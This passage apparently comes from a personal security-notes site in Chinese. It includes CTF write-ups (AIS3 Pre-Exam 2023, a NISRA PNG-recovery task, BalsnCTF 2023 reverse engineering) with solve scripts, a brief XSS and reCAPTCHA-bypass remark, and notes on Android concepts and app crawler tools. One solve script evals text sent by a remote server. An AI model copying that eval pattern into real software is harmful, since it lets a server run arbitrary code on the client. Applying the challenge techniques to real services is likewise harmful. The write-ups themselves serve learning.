AIS3{Ju5T_a_ea5y_1nT_0veRflow_4nD_Buf_OvErfLOW}\nReference # ywc\u0026rsquo;s writeup\n"},{"id":26,"href":"/security/competition/ais3-pre-exam-2023/","title":"AIS3 Pre-Exam 2023","section":"Securities","content":" AIS3 Pre-Exam 2023 # tags: CTF EOF2023 # :::spoiler TOC [TOC] :::\nWeb # E-Portfolio baby # Recon # 直接用Burp Suite可以繞過reCAPTCHA，而且About Guest的內容會被完整的render出來達到XSS\nLogin Panel # Recon # 我又找到了一個破解谷歌驗證碼的新方案！ yescaptcha Reverse # Pwn # Simply Pwn # Recon # checksec $ checksec pwn [*] Checking for new versions of pwntools To disable this functionality, set the contents of /home/sbk6401/.cache/.pwntools-cache-3.7/update to \u0026#39;never\u0026#39; (old way). Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide): [update] interval=never [*] You have the latest version of Pwntools (4.9.0) [*] \u0026#39;/home/sbk6401/CTF/AIS3-Pre-Exam/PWN/Simply Pwn/pwn\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Misc # Welcome # 縮小檔案就看的到flag了 Flag: AIS3{WELCOME-TO-2023-PRE-EXAM-\u0026amp;-MY-FIRST-CTF}\nRobot # 簡單的Script，但是題目敘述太不直覺了吧 :::spoiler Script\nfrom pwn import * context.arch = \u0026#39;amd64\u0026#39; r = remote(\u0026#34;chals1.ais3.org\u0026#34;, 12348) r.recvline() r.recvline() for i in range(30): question = r.recvline().decode().strip() ans = eval(question) sleep(1) r.sendline(str(ans).encode()) print(r.recvline()) r.interactive() ::: Flag: AIS3{don't_eval_unknown_code_or_pipe_curl_to_sh}\nCrypto # Fernet # 就直接按照decrypt的流程跑一次就好了 :::spoiler Source Code\nimport os import base64 from cryptography.fernet import Fernet from Crypto.Hash import SHA256 from Crypto.Protocol.KDF import PBKDF2 from pwn import * def decrypt(ciphertext, password, salt): key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256) f = Fernet(base64.urlsafe_b64encode(key)) plaintext = f.decrypt(ciphertext) return plaintext leak_password = \u0026#39;mysecretpassword\u0026#39; ciphertext = \u0026#39;iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj\u0026#39; tmp = base64.b64decode(ciphertext) salt = tmp[:16] ciphertext = tmp[16:] print(decrypt(ciphertext, leak_password, salt)) ::: Flag: FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!_!!!_!}\n2DES # meet in the middle attack 這一題沒有解出來，兩個exploit source code都有點問題導致無法實踐，但邏輯應該是對的 :::spoiler JS Source Code const crypto = require(\u0026#39;crypto\u0026#39;) const assert = require(\u0026#39;assert\u0026#39;) const hint_pt = Buffer.from(\u0026#39;AIS3{??????????}\u0026#39;, \u0026#39;utf8\u0026#39;) let hint = \u0026#39;118cd68957ac93b269335416afda70e6d79ad65a09b0c0c6c50917e0cee18c93\u0026#39; const iv = Buffer.concat([Buffer.from(\u0026#39;AIS3 三\u0026#39;)]) console.log(iv) function encrypt(msg, key, iv) { const cipher = crypto.createCipheriv(\u0026#39;des-cbc\u0026#39;, key, iv) let encrypted = cipher.update(msg) encrypted = Buffer.concat([encrypted, cipher.final()]) return encrypted } function decrypt(msg, key, iv) { const decipher = crypto.createDecipheriv(\u0026#39;des-cbc\u0026#39;, key, iv) let decrypted = decipher.update(msg, \u0026#39;nyan~\u0026#39;) decrypted = Buffer.concat([decrypted, decipher.final()]) return decrypted } function intToHexStr(num) { var hexString = \u0026#39;\u0026#39;; for (var i = 0; i \u0026lt; 8; i++) { var byte = num \u0026amp; 0xff; // 获取低8位 var hex = byte.toString(16).padStart(2, \u0026#39;0\u0026#39;); // 转换为两位的十六进制字符串 hexString = hex + hexString; // 将转换后的字符串拼接到结果中 num = num \u0026gt;\u0026gt; 8; // 右移8位，处理下一个字节 } return hexString; } var key1_table = [] var key2_table = [] var key1 = key2 = Buffer.from(intToHexStr(256), \u0026#39;hex\u0026#39;) for (let idx = 0; idx \u0026lt; 2**32; idx++) { tmp = encrypt(hint_pt, key1, iv) key1_table.push(tmp) key2_table.push(decrypt(hint, key2, iv)) var key1 = key2 = Buffer.from(intToHexStr(idx + 1), \u0026#39;hex\u0026#39;) } for (let i = 0; i \u0026lt; 2**32; i++) { for (let j = 0; j \u0026lt; 2**32; j++) { if (key1_table[i] == key2_table[j]) { console.log(\u0026#34;key1 = \u0026#34;, i, \u0026#34;\\nkey2 = \u0026#34;, j) break } } } :::\n:::spoiler Python Source Code\n# from Crypto.Cipher import DES from tqdm import trange from pyDes import des, CBC, PAD_PKCS5 hint_pt = \u0026#39;AIS3{??????????}\u0026#39; hint = \u0026#39;118cd68957ac93b269335416afda70e6d79ad65a09b0c0c6c50917e0cee18c93\u0026#39; iv = b\u0026#39;4149533320e4b889\u0026#39; key1_table = [] key2_table = [] def encrypt(m, key, iv): # des = DES.new(key, DES.MODE_CBC, iv) k = des(\u0026#34;0\u0026#34; * 8, CBC, \u0026#34;0\u0026#34;*8, pad=None, padmode=PAD_PKCS5) k.setKey(key) k.setIV(iv) return k.encrypt(m, padmode=PAD_PKCS5) def decrypt(c, key, iv): # des = DES.new(key, DES.MODE_CBC, iv) k = des(\u0026#34;0\u0026#34; * 8, CBC, \u0026#34;0\u0026#34;*8, pad=None, padmode=PAD_PKCS5) k.setKey(key) k.setIV(iv) return k.decrypt(c, padmode=PAD_PKCS5) key1 = key2 = \u0026#39;{0:0\u0026gt;16x}\u0026#39;.format(0).encode() for idx in range(2**32): key1_table.append(encrypt(hint_pt, key1, iv)) key2_table.append(decrypt(hint, key2, iv)) key1 = key2 = \u0026#39;{0:0\u0026gt;16x}\u0026#39;.format(idx + 1).encode() for i in range(len(key1)): for j in range(len(key2_table)): if key1_table[i] == key2_table[j]: print(\u0026#34;key1 = {}\\nkey2 = {}\u0026#34;.format(i, j)) :::\n"},{"id":27,"href":"/terminology/android-related/","title":"Android Related","section":"Terminologies","content":" Android Related # Android App本身 # [Android] Activity基本介紹 :::spoiler\n什麼是Activity? Activity是App中，提供畫面的一個元件， 例如：使用Google地圖App時，顯示地圖的那個畫面。\n只有Activity可以顯示畫面嗎？ 不是，除了Activity以外還有其他元件可以顯示畫面， 例如：Dialog，但每一個App至少要有一個Activity，但這有個例外，如果這個App不提供介面的話也是可以不用有Activity的。\nActivity其他注意事項\n兩個Activity傳遞資訊是透過Intent Intent intent = new Intent(this, TwoActivity.class); startActivity(intent); Intent 能傳遞的資訊大小要小於512k 每一個Activity都要在AndroidManifest中聲明 \u0026lt;manifest ... \u0026gt; \u0026lt;application ... \u0026gt; \u0026lt;activity android:name=\u0026#34;.MainActivity\u0026#34; /\u0026gt; ... \u0026lt;/application ... \u0026gt; ... \u0026lt;/manifest \u0026gt; Android基本(2)-Intent基本觀念與使用釐清 :::spoiler\n我們該如何從一個 activity 去啟動另外一個 activity，又或者我們要怎麼進行兩個 activity 間的資料通等等的問題，這時候最常見的方式就是使用我們今天的主角 Intent\n種類 # 下方名稱網路上對他們的名稱有些需的差異，在這邊以 android doc 上名稱為主。\n明確意圖(Explicit intents)：官方的說明有點冗長，講白一點就是在指定啟動元件的時候，我們直接使用名稱(完整的類別名稱)進行指定。 例如： Intent intent = new Intent(FirstActivity.this, SecondActivity.class); 隱含意圖(Implicit intents)：在宣告的時候不指定給特定的元件，而是針對功能、動作進行宣告，來讓定一個應用程式的元件進行處理。 例如：在APP中開啟網頁，系統發現手機上有chrome以及預設瀏覽器提供網頁瀏覽的功能，這時候便會跳出選單讓使用者選擇。 範例 # 明確意圖範例 Intent intent = new Intent(FirstActivity.this, SecondActivity.class); startActivity(intent);\n這邊我的例子是在兩個 activity 間的互動，service相關使用可以參考 google doc 中的範例。\n隱含意圖範例 Intent intent = new Intent(); intent.setAction(Intent.ACTION_VIEW); intent.setData(Uri.parse(\u0026quot;https://google.com\u0026quot;)); startActivity(intent); 這邊這個例子是開啟網頁的使用，另外在 google doc 中的例子是發送電子郵件，也可以進行參考。\nWhat is entity in android?\nfields and classes defined in Android framework\nWhat is field in Android? :::spoiler Documentation\nA Field provides information about, and dynamic access to, a single field of a class or an interface. The reflected field may be a class (static) field or an instance field.\nA Field permits widening conversions to occur during a get or set access operation, but throws an IllegalArgumentException if a narrowing conversion would occur.\n012-定義類別與建立物件\n在類別中, 需使用成員變數 (Member Variable) 來描述類別的屬性, 在 Java語言中又稱其為類別的欄位 (Field)。 成員變數的宣告方式, 和前面所用的一般變數差不多, 例如我們的汽車類別要有記錄載油量、耗油率, 可寫成：\nclass Car{ double gas; //載油量 double eff; //耗油率 } what is a dex file? 其實就是我們拿到的APK當中的執行檔\nDalvik executable files are developer files affixed with the .dex extension, and these DEX files are used to initialize and execute applications developed for the Android mobile OS. The data stored in these DEX files includes compiled code that locates and initializes other program files of the associated application required to run the program.\nAndroid adb基本用法教學\nadb(Android Debug Bridge)指令是開發 Android 時常用到的工具，使用 adb 指令可對 android 裝置進行除錯、測試、檔案處理、安裝/移除 apk 等的操作\nAndroid的簽章 :::spoiler 在Android系統安全中有3個主要的技術: Permission Management, Signature Authentication, 以及Sandbox Mechanism，現在主要探討的問題就是在簽章的技術底下。Android的數位簽章總共會包含三個東西: MANIFEST.MF, CERT.SF, CERT.RSA\nMANIFEST.MF 是一個Digest File也就是存所有更新的打包檔案的Hash Value CERT.SF 是一個Signature File，他會用SHA1計算MANIFEST.MF中的所有東西再用Base64進行Encode CERT.RSA 存放Public Key+加密演算法是哪一個+用自己的Private Key加密CERT.SF中的所有東西的結果 什麼是 Hybrid？ 資料來源: React Native vs Cordova 簡介\n首先要先知道 Hybrid 的由來，簡單來說，因為現在的 APP 生命週期太短，要知道市場需要什麼樣類型的 APP，所以就需要可以快速開發 APP 出來，而使用 Hybrid 是最快且最省成本的方式，Hybrid 架構簡單來說，就是讓開發者可以透過撰寫一次程式碼，就可以建置成各種平台的應用程式，例如 iOS, Android, 或 Windows Phone。 而目前 Hybrid 的架構有很多種，例如：React Native, Cordova, Capacitor, Ionic, Flutter, Xamarin, Onsen UI, Framework7，每種開發方式及優缺點都不太一樣\n資料來源: :::info Liu, Y., Zuo, C., Zhang, Z., Guo, S., \u0026amp; Xu, X. (2018). An automatically vetting mechanism for SSL error-handling vulnerability in android hybrid Web apps. World Wide Web, 21, 127-150. :::\nHybrid mobile Web apps的優點如下： 構建速度更快、成本更低 可以利用特定於裝置的功能，例如作為電話聯繫人訪問 對於不同的平臺和不同的設備，開發者只需要重寫一部分的本機代碼 易於維護。因為Hybrid mobile Web apps在 Web 伺服器上完成大部分工作易於維護\n什麼是Gradle? 資料來源: 認識 Gradle 專案建置自動化工具 Gradle 簡單說就是 Java 世界的 Makefile，它可以幫忙打理那些在專案開發過程中的瑣事，舉凡編譯、測試、檢查程式碼、產生文件、清理或壓縮檔案、上傳、發佈、重新啟動伺服器到送出電子郵件，都可以利用 Gradle 撰寫的 Script 來自動完成作業。\nAndroid Broadcast Receiver 資料來源: Android Broadcast Receiver 教學\nAndroid Broadcast Receiver 元件讓 app 可以從 Android 系統或其他 apps 接收訊息，也可以傳送訊息給 app 自己的其他元件，或是其他 apps。它類似於 publish-subscribe 設計模式。本文章將介紹如何使用 Broadcast Receiver。\n當有系統事件發生時，Android 系統自動地廣播事件給所有監聽該事件的 apps。例如，當使用者開啟或關係飛航模式時，系統會廣播 ACTION_AIRPLANE_MODE_CHANGED 事件。 App 也可以廣播事件給所有監聽該事件的 apps。當然 App 自己也可以監聽自己廣播的事件。\nManifest-declared receivers 指的是在 AndroidManifest.xml 中註冊的 receivers。在 中設定監聽事件的 class，並且在 中指定要監聽的事件。如果事件來源是系統或是其他的 apps，還要設定 android:exported=\u0026ldquo;true\u0026rdquo;。\nWhat is ABI(Application Binary Interface)? 資料來源: Android中的ABI以及對應CPU的版本說明\nABI是Application Binary Interface的縮寫。 ABI常表示兩個Process Module之間的接口，且其中一個module常為機器碼級別的library或操作系統。 ABI定義了函數庫的調用、應用的二進制文件（尤其是.so）如何運行在相應的系統平台上等細節。 Android目前支持以下七種ABI：armeabi, armeabi-v7a, arm64-v8a, x86, x86_64, mips, mips64。 Android中的ABI與CPU # 每種CPU架構都有其自己支持的ABIs。可通過Build.SUPPORTED_ABIS得到根據偏好排序的設備支持的ABI列表。 ARM64 VS aarch64 資料來源: arm64和aarch64之間的區別\n直接給出結論：arm64已經與aarch64合並，因為aarch64和arm64指的是同一件事。\nWhat is Deeplink? 資料來源: Deep Link教學 - 點擊網址開啟APP\n點擊網址開啟APP，就是 deep link，只要在APP上設定 url scheme即可。 ![image-editor-GXBI2mtT2G157959888112324](https://hackmd.io/_uploads/BkMpvK7w0.jpg =200x)\n更準確的說，deeplink在做的事情是實現跨App之間的跳轉，資料來源: Android App Links 設定心得筆記\nAndroid Framework # React-Native 檔案結構與說明 # $ tree -L 3 ./android . ├── app │ ├── build │ │ ├── generated │ │ ├── intermediates │ │ ├── kotlin │ │ ├── kotlinToolingMetadata │ │ ├── outputs │ │ └── tmp │ ├── build.gradle │ ├── debug.keystore │ ├── my-release-key.jks │ ├── proguard-rules.pro │ └── src │ ├── debug │ ├── main │ └── release ├── build │ └── kotlin │ └── sessions ├── build.gradle ├── gradle │ └── wrapper │ ├── gradle-wrapper.jar │ └── gradle-wrapper.properties ├── gradle.properties ├── gradlew ├── gradlew.bat └── settings.gradle 頂層目錄的文件和Folder # build.gradle # 項目級的 Gradle 配置文件。 包含全局的配置，如： 所用的 Gradle 插件版本。 Maven 倉庫位置。 應用模塊的路徑。 它調用 settings.gradle 來定義哪些Module需要被構建。 gradlew \u0026amp; gradlew.bat # 用於在項目中運行 Gradle 的腳本。 gradlew 是用於 Linux/macOS 的可執行腳本。 gradlew.bat 是用於 Windows 的批處理腳本。 gradle.properties # 全局的 Gradle 屬性配置文件。 可以設置項目的 JVM 參數和其他優化選項，比如 org.gradle.daemon=true 或 android.useAndroidX=true。 settings.gradle # 定義項目中包含的模塊（如 app）。 通常看起來像： rootProject.name = \u0026#34;YourProjectName\u0026#34; include \u0026#39;:app\u0026#39; gradle/wrapper/ Folder # 包含 Gradle Wrapper 的配置和二進制文件（gradle-wrapper.jar）。 gradle-wrapper.properties： 定義使用的 Gradle 版本。 包含 Gradle 下載的路徑配置。 app/ Folder # 1. build/ # 自動生成的Folder，包含構建過程中的中間文件。 主要子Folder： generated/：自動生成的代碼文件，例如資源綁定文件。 intermediates/：構建的中間文件，如優化的資源和處理後的字節碼。 outputs/：生成的 APK 文件或其他構建產物。 tmp/：臨時文件。 2. build.gradle # 應用級的 Gradle 配置文件。 定義特定模塊的依賴項和構建配置，如 SDK 版本、簽名配置等。 3. debug.keystore # 默認的簽名密鑰文件，用於對 Debug APK 進行簽名。 開發階段使用，不建議在生產環境使用。 4. my-release-key.jks # 自定義的密鑰庫，用於對 Release APK 進行簽名。 必須安全存儲，不然應用的簽名會失效。 5. proguard-rules.pro # 用於配置 ProGuard 混淆規則。 ProGuard 會壓縮、優化、混淆代碼以減少應用大小並提高安全性。 6. src/ # 包含應用的源代碼和資源。 debug/：特定於 Debug 構建的配置或資源。 main/：主要的應用代碼和資源，包括： java/：Java 或 Kotlin 源代碼。 res/：應用的資源文件（XML、圖像等）。 AndroidManifest.xml：定義應用的權限、活動和服務等。 release/：特定於 Release 構建的配置或資源。 build/ Folder # 1. kotlin/sessions/ # 用於存儲 Kotlin 編譯會話信息。 輔助增量編譯，加快編譯速度。 總結 # 項目級文件（如 build.gradle 和 settings.gradle）配置全局的項目環境。 應用模塊（app Folder）包含具體的代碼和資源。 構建Folder（build/）保存中間文件和最終的產物。 密鑰文件和混淆規則等則保證應用安全和優化。 "},{"id":28,"href":"/tools/others/android-app-crawler/app-crawler-overview/","title":"App Crawler Overview","section":"Tools","content":" Android App Crawler # 目前僅針對以下功能進行查找\n可以自行判斷目前activity有哪些可以interact 自行與這些interactable的view進行interact，不管是DFS或是BFS，反正就是全部都互動就對了 比較常見的 # App Crawler 123 - 無法使用 seveniruby/AppCrawler 456789 - 無法使用 zhangzhao4444/Maxim - 無法使用 Eaway/AppCrawler isonic1/Appium-Native-Crawler 根據Paper Related Work # Stoat :::info Ting Su, Guozhu Meng, Yuting Chen, Ke Wu, Weiming Yang, Yao Yao, Geguang Pu, Yang Liu, and Zhendong Su. 2017. Guided, stochastic model-based GUI testing of Android apps. In Proceedings of the 2017 11th Joint Meeting on Foundations of Software Engineering (ESEC/FSE 2017). Association for Computing Machinery, New York, NY, USA, 245–256. https://doi.org/10.1145/3106237.3106298 ::: 詳細的說明(包含Demo影片、比較的工具、測試的App)，都可以參考 https://tingsu.github.io/files/stoat.html UI/Application Exerciser Monkey - 不會採用 這是上一篇所比較的對象之一，可以想像成一個猴子正在對一個手機上的App進行隨機互動，可能包含簡單的click, double click, long click或是swipe等等 $ adb shell monkey -p com.music.spotify -v 50000 最後面的數字代表隨機丟出多少的event給特定的App a3e - 年代久遠不採用 也是第一篇的比較對象之一 Sapienz - 無法使用 也是第一篇的比較對象之一 APE - official webpage / APE - github - github star太少且年代久遠不採用 這是第一篇有提到的工具之一 Fastbot Android - 可採用 這是前一個APE官網有提到的工具，而且開發時間還蠻近的，github star也很多，也有CSDN教學 Droidbot - 可能採用 :::info Li, Y., Yang, Z., Guo, Y., \u0026amp; Chen, X. (2017, May). Droidbot: a lightweight ui-guided test input generator for android. In 2017 IEEE/ACM 39th International Conference on Software Engineering Companion (ICSE-C) (pp. 23-26). IEEE. ::: 年代有點久遠，但網路上的教學也蠻多的，官網也有提供範例 Androidenv - 可能採用 :::info Toyama, D., Hamel, P., Gergely, A., Comanici, G., Glaese, A., Ahmed, Z., \u0026hellip; \u0026amp; Precup, D. (2021). Androidenv: A reinforcement learning platform for android. arXiv preprint arXiv:2105.13231. ::: 年代較近，也有教學 實驗的來源以及標準 # 如果僅僅是要app本身是開源的可以從F-Droid當中去找，這個網站就是一個免費的Google Play Store，但是我要找的除了是app本身開源，後端本身也要開源，k因為這樣我才知道後端的URL有多少，如果想要知道有哪些可能可以拿來實驗的App，可以看Guided, stochastic model-based GUI testing of Android apps.這一篇論文(就是前面提到的第一篇)\n透過CodePilot幫我找 # awesome-appwrite FoodMagic: 這是一個使用 Flutter 和 Appwrite 構建的應用程式\nao: 這是一個使用 Ionic 和 Appwrite 構建的待辦事項應用程式\nReference # 如何使用Android官方提供的自動進行UI掃描測試? (AppCrawler)\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHow to run Android “App Crawler” testing tool\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAndroid testing “monkey” tool\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n自動化測試的理想境界：AppCrawler自動遍歷工具 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n初探自動遍歷測試工具-AppCrawler \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n以AppCrawler的設定檔完成客製化的自動遍歷測試(基礎)-01 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n以AppCrawler的設定檔完成客製化的自動遍歷測試(實操)-02 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n利器| AppCrawler 自動遍歷測試工具實務（一）\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nAppCrawler自動遍歷測試 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":29,"href":"/tools/others/android-app-crawler/app-crawler-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/","title":"App Crawler 無法使用紀錄","section":"Tools","content":" App Crawler 無法使用紀錄 # 根據Android Studio官網的說明\n$ java -jar crawl_launcher.jar --apk-file path/to/my/app.apk --android-sdk path/to/my/android/sdk 我已經有安裝app在手機了，所以實際的command如下\n$ java -jar crawl_launcher.jar --app-package-name com.xueqiu.android --android-sdk C:\\Users\\Bernie\\AppData\\Local\\Android\\Sdk Preparing to crawl com.xueqiu.android Crawl started. Crawl finished. Writing logcat to D:\\NTU\\Paper\\MITM Framework\\Code\\AppCrawler\\Google App Crawler\\crawl_output\\com.xueqiu.android-logcat.txt SUCCESS: Found 0 crashes. Timed out waiting for crawl outputs proto file D:\\NTU\\Paper\\MITM Framework\\Code\\AppCrawler\\Google App Crawler\\crawl_output\\app_firebase_test_lab\\crawl_outputs.proto The output directory is D:\\NTU\\Paper\\MITM Framework\\Code\\AppCrawler\\Google App Crawler\\crawl_output 但全程就只有大約不到30秒就結束了，不太懂流程到底出錯在哪，而且就算沒有安裝app，再重新跑一次，居然還可以沒有出錯的跑完；又或者是，把在沒有安裝app的情況下，用官網的command跑會直接當掉，無法繼續往下繼續跑，就一整個就很怪，但網路上也沒有比較新的說明\n"},{"id":30,"href":"/tools/others/android-app-crawler/appcrawler/","title":"AppCrawler","section":"Tools","content":" AppCrawler # 前面踩了超多坑，所以一切都以底下最新的配置為主\nInfra # Appium - 1.22.3 一定要是2.0.0以下(未包含)，所以不要用default latest version，可以用CLI也可以用Desktop，因為Desktop Version預設已經no longer supported，所以一定是1.22.3，而CLI安裝就需要指定(以下是已經安裝npm為前提) $ npm install -g appium@1.22.3 $ npm install -g appium-doctor 設定ANDROID_HOME和JAVA_HOME 到Windows環境變數設定 然後去看appium-doctor看necessary的部分是不是都有，一般來說可能會apkanalyzer.bat會沒有，這方面就慢慢到網路上去載android studio下載tools AppCrawler - latest (2.7.4) 就直接到github release去下載build好的jar file，不需要看其他教學是用2.4.0或是2.3.1去用stb或是maven build原本的專案 Official Link: https://github.com/seveniruby/AppCrawler/releases/tag/2.7.4 測試前 # app activity name 如果已經在手機安裝好，就直接看dumpsys中該package的main activity是哪一個 $ adb shell dumpsys package com.spotify.music | grep -B 2 \u0026#34;android.intent.action.MAIN\u0026#34; -n 279- Action: \u0026#34;com.google.android.meet.ADDONS_SUPPORT\u0026#34; 280- Category: \u0026#34;android.intent.category.DEFAULT\u0026#34; 281: android.intent.action.MAIN: 282- 553d29 com.spotify.music/.SpotifyMainActivity filter 3a3b8ae 283: Action: \u0026#34;android.intent.action.MAIN\u0026#34; -- 286- Category: \u0026#34;android.intent.category.APP_MUSIC\u0026#34; 287- 7cd1a0c com.spotify.music/.main.AppIconEmeraldGreen filter 18bef55 288: Action: \u0026#34;android.intent.action.MAIN\u0026#34; -- 290- Category: \u0026#34;android.intent.category.DEFAULT\u0026#34; 291- c3efd6a com.spotify.music/.MainActivity filter 204625b 292: Action: \u0026#34;android.intent.action.MAIN\u0026#34; -- 307- android.intent.action.MUSIC_PLAYER: 308- 553d29 com.spotify.music/.SpotifyMainActivity filter 3a3b8ae 309: Action: \u0026#34;android.intent.action.MAIN\u0026#34; 另外一種方式就是用apktool反編譯後去看AndroidManifest.xml，一樣就是string search ==android.intent.action.MAIN==，但反編譯後會有一大堆files，可能會很佔空間 $ apktool d your_app.apk app package name 如果已經安裝了，就直接list package $ adb shell pm list package | grep spotify package:com.spotify.music 要不然就要用aapt去看 $ aapt d badging Spotify.apk | findstr package package: name=\u0026#39;com.spotify.music\u0026#39; versionCode=\u0026#39;116658084\u0026#39; versionName=\u0026#39;8.9.58.572\u0026#39; platformBuildVersionName=\u0026#39;14\u0026#39; platformBuildVersionCode=\u0026#39;34\u0026#39; compileSdkVersion=\u0026#39;34\u0026#39; compileSdkVersionCodename=\u0026#39;14\u0026#39; uses-permission: name=\u0026#39;com.sec.android.app.clockpackage.permission.READ_ALARM\u0026#39; 開啟appium 如何檢視有正確開啟並且有連線到 $ appium [Appium] Welcome to Appium v1.22.3 [Appium] Appium REST http interface listener started on 0.0.0.0:4723 $ curl http://127.0.0.1:4723/wd/hub/status {\u0026#34;value\u0026#34;:{\u0026#34;build\u0026#34;:{\u0026#34;version\u0026#34;:\u0026#34;1.22.3\u0026#34;}},\u0026#34;sessionId\u0026#34;:null,\u0026#34;status\u0026#34;:0} 實際測試 # $ java -jar appcrawler-2.7.4-hogwarts.jar --capability \u0026#34;appPackage=com.spotify.music,appActivity=MainActivity\u0026#34; 注意事項 # :::danger 基本上這個tool還是依照大量截圖的方式判斷有無換頁，所以依照現在android版本的更新，開發商如果設定成無法截圖的方式，就無法做後續的測試 ::: :::danger 根據以上的步驟，還是非常有可能會遇到問題，我自己在用physical device時，最常遇到java.lang.RuntimeException: Error creating extended parser class: Could not determine whether class ‘org.pegdown.Parser$$parboiled’ has already been loaded，在使用emulator的時候，也會遇到Exception in thread “main” java.awt.image.RasterFormatException: (y + height) is outside of Raster\n但通通得不到解決的方式 :::\n"},{"id":31,"href":"/security/practice/nisra/misc/nisra---%E7%9C%8B%E4%B8%8D%E8%A6%8B%E7%9A%84%E5%9C%B0%E6%96%B9/","title":"Background","section":"Securities","content":" NISRA - 看不見的地方 # Background # advanced-potion-making:two::+1:\nRecon # 這題出的不錯，我用了所有方法都沒看到甚麼奇怪的東西，除了pngcheck\n$ pngcheck flag.png flag.png CRC error in chunk IHDR (computed 68ff0ded, expected 8c5880da) ERROR: flag.png 代表檔案可能有一些問題 原圖： Exploit - Recover PNG File # 參考UP主的腳本，可以直接寫出長寬\nimport zlib import struct import sys filename = sys.argv[1] with open(filename, \u0026#39;rb\u0026#39;) as f: all_b = f.read() crc32key = int(all_b[29:33].hex(),16) data = bytearray(all_b[12:29]) n = 4095 for w in range(n): width = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, w)) for h in range(n): height = bytearray(struct.pack(\u0026#39;\u0026gt;i\u0026#39;, h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(\u0026#34;寬為：{}(hex), {}(int)\u0026#34;.format(width.hex(), int(width.hex(), 16))) print(\u0026#34;高為：{}(hex), {}(int)\u0026#34;.format(height.hex(), int(height.hex(), 16))) exit(0) $ python exp.py flag.png 寬為：00000258(hex), 600(int) 高為：00000148(hex), 328(int) 可以看得出來高的數值不一樣\n修復png file 把原本的高0120$\\to$0148 "},{"id":32,"href":"/security/competition/balsnctf-2023/","title":"BalsnCTF 2023","section":"Securities","content":" BalsnCTF 2023 # Reverse # Lucky # Source code # :::spoiler IDA Main Function\n__int64 main_fn() { __int64 idx; // r15 int v1; // ebp __int64 v2; // rbx unsigned __int64 v3; // r14 int v4; // r9d int v5; // r9d char v6; // al __int64 v7; // rdx unsigned int v9; // [rsp+Ch] [rbp-9Ch] BYREF char v10[32]; // [rsp+10h] [rbp-98h] BYREF __int128 user_input[2]; // [rsp+30h] [rbp-78h] BYREF __int64 v12; // [rsp+50h] [rbp-58h] char v13; // [rsp+58h] [rbp-50h] unsigned __int64 v14; // [rsp+68h] [rbp-40h] idx = 10000000000000000LL; v1 = 0; v14 = __readfsqword(0x28u); v2 = sub_40C2B0(\u0026#34;/dev/urandom\u0026#34;, \u0026amp;unk_498004); do { sub_40C3B0(\u0026amp;v9, 4uLL, 1LL, v2); v3 = v9 % 100000000uLL; sub_40C3B0(\u0026amp;v9, 4uLL, 1LL, v2); v1 -= (v3 * v3 + v9 % 100000000uLL * (v9 % 100000000uLL) \u0026gt; 9999999999999999LL) - 1; --idx; } while ( idx ); sub_44A050(v10, 1u, 30LL, \u0026#34;%lu\u0026#34;, 4 * v1 - 0x4F430000, v4); v13 = 0; v6 = 0x73; v12 = 0LL; memset(user_input, 0, sizeof(user_input)); while ( 1 ) { v7 = idx \u0026amp; 0xF; *(user_input + idx++) = v10[v7] ^ v6; if ( idx == 40 ) break; v6 = byte_498040[idx]; } if ( LOBYTE(user_input[0]) == \u0026#39;B\u0026#39; \u0026amp;\u0026amp; *(user_input + 1) == \u0026#39;NSLA\u0026#39; \u0026amp;\u0026amp; BYTE5(user_input[0]) == \u0026#39;{\u0026#39; \u0026amp;\u0026amp; HIBYTE(v12) == \u0026#39;}\u0026#39; ) sub_44A130(1, \u0026#34;Lucky! flag is %s\\n\u0026#34;, user_input, byte_498040, user_input, v5); else (sub_40C4B0)(\u0026#34;Not so lucky ...\u0026#34;, 1LL, v7, byte_498040, user_input); if ( v14 != __readfsqword(0x28u) ) (sub_44A220)(); return 0LL; } :::\nRecon # 這是水題，基本上先用ida逆一下，就會看到上面的main function，不過用動態去看很醜，而且要等很久，估計應該是為了拖時間，反正最關鍵的部分在#36~#43這個while loop，還好這一題沒有把關鍵的code藏在tls這種奇怪的地方，或是像crectf - ez rev那樣用shell code噁心人，每次看到這種一大堆sub_function心裡都會倒抽一口氣，還好這次出題的人有良心(?)，反正仔細看一下#44驗證的部分就會知道前面6個bytes是BALSN{，所以代表它只是針對ciphertext做XOR的操作，也就是和v10這個變數，但是v10是從前面來的，也就是要先跳過那超級長的loop才能得知v10存了啥東西，原本到這邊就卡住了，一直用想說可不可以用動態直接dump解密完的結果，但我發現compiler應該有做一些scramble之類的操作讓動態很難看，反正過程就是一整個超卡，後來經過學長提示才想到可以用推的算回去，太久沒有寫reverse題就是這樣，基操的忘記了，反正可以先看一下XOR後的結果和原本的CT做比較，會發現output是141592的字串，看上去很眼熟應該就是圓周率，又觀察#38，它是取index mod 16後的結果，所以只需要取$\\pi$的前16個字元，再往後面繼續操作就可以了\nct = [0x73, 0x75, 0x7D, 0x66, 0x77, 0x49, 0x5A, 0x60, 0x50, 0x7E, 0x67, 0x08, 0x44, 0x66, 0x40, 0x02, 0x5E, 0x7B, 0x01, 0x7A, 0x66, 0x03, 0x5B, 0x65, 0x03, 0x47, 0x0F, 